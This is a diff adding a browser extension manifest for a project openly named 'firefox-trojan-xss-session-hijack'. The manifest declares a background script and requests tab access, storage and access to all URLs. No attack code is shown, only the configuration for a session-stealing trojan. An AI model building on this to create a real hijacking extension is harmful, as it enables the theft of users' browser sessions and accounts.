@@ -1,0 +1,21 @@
+{
+    "name": "firefox-trojan-xss-session-hijack",
+    "version": "1.0.0",
+    "description": "trojan-xss-session-hijack",
+    "icons": {
+      "16": "/app/img/ico.png",
+      "48": "/app/img/ico.png",
+      "128": "/app/img/ico.png"
+    },
+    "offline_enabled": true,
+    "background": {
+      "scripts": ["app/js/background.js"],
+      "persistent": false
+    },
+    "permissions": [
+        "tabs",
+         "<all_urls>",
+        "storage"
+    ],
+    "manifest_version": 2
+}
